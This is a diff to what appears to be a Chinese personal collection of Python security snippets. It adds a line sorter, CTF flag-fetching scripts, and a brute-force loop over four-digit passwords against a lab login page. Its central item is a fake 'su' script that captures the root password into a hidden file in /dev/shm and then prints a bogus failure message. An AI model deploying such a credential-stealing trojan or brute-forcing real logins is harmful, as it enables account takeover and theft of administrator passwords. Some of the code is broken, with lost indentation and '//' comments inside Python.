@@ -11,7 +11,7 @@
 占位符与转义符
 
 
-
+#python基础语法
 
 
 
@@ -178,4 +178,83 @@ def checkSuccess(keys, mycrc32, words):
 endTime = time.time() 
 print "Result : " + str(RESULT) 	# 输入爆破结果 
 print "Cost : " + str(endTime-startTime) + " s" # 输出总花费时间
+}
+
+{
+    #!/bin/bash/python  
+    import sys  
+    from collections import Counter  
+    file = open(sys.argv[1], 'r')  
+    readlist = []  
+    count_times = []  
+    for line in file.readlines():  
+    line = line.strip('\r\n ')  
+    readlist.append(line)  
+    sortlist = Counter(readlist).most_common()  
+    for line in sortlist:  
+    print line[0]
+}
+	
+#记录root密码小工具
+{
+    #!/usr/bin/python  
+    import os, sys, getpass, time  
+    current_time = time.strftime("%Y-%m-%d %H:%M")  
+    logfile="/dev/shm/.su.log"              //密码获取后记录在这里  
+    #CentOS                  
+    #fail_str = "su: incorrect password"  
+    #Ubuntu               
+    #fail_str = "su: Authentication failure"  
+    #For Linux Korea                    //centos,ubuntu,korea 切换root用户失败提示不一样  
+    fail_str = "su: incorrect password" 
+    try:  
+        passwd = getpass.getpass(prompt='Password: ');  
+        file=open(logfile,'a')  
+        file.write("[%s]t%s"%(passwd, current_time))   //截取root密码  
+        file.write('n')  
+        file.close()  
+    except:  
+        pass 
+    time.sleep(1)  
+    print fail_str                               //打印切换root失败提示 
+
+}
+
+#设置源端口反弹shell
+{
+
+}
+
+
+#自动获取flag
+{
+    import requests   
+    import base64  
+      
+    url='http://ctf4.shiyanbar.com/web/10.php'   
+    req=requests.get(url)  
+    print req.text  
+    key=req.headers['FLAG']  
+    key=base64.b64decode(key)  
+    key=key.split(':')[1].strip()  
+    data={'key':key}  
+    r=requests.post(url,data=data)   
+    print(r.text)  
+}
+#自动提交flag
+{
+import requests  
+  
+url = "http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php"  
+req = requests.session()  
+header = {"Cookie":"PHPSESSID=9b8f8686269f5d70a44766e3c5f4dcdc"}  
+for pwd in xrange(1000,10000):  
+  
+	data={'username':'admin','pwd':pwd,'vcode':'c3pe'}  
+  
+	ret = req.post(url, data=data, headers=header)  
+	print ret.text  
+	if 'error' not in ret.text:  
+		print pwd  
+		break  
 }
